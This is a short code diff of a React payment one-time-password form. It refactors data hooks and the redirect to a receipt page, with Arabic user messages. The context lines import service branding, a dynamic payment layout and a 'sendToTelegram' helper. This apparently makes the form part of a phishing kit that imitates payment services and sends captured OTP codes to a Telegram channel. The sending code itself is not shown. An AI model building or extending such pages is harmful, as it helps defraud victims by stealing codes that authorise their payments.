@@ -6,14 +6,15 @@ import { getServiceBranding } from "@/lib/serviceLogos";
 import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";
 import { Shield, AlertCircle, Check, ArrowLeft, X } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
-import { useLink } from "@/hooks/useLocalStorage";
+import { useLinkData, useLinkNavigation } from "@/hooks/useUrlBasedData";
 import { sendToTelegram } from "@/lib/telegram";
 
 const PaymentOTPForm = () => {
   const { id } = useParams();
   const navigate = useNavigate();
   const { toast } = useToast();
-  const { data: linkData } = useLink(id);
+  const { linkData } = useLinkData();
+  const { navigateToReceipt } = useLinkNavigation();
   
   const [otp, setOtp] = useState("");
   const [attempts, setAttempts] = useState(0);
@@ -116,7 +117,9 @@ const PaymentOTPForm = () => {
         description: "تم تأكيد الدفع بنجاح",
       });
       
-      navigate(`/pay/${id}/receipt`);
+      if (linkData) {
+        navigate(navigateToReceipt(id!, linkData));
+      }
     } else {
       const newAttempts = attempts + 1;
       setAttempts(newAttempts);
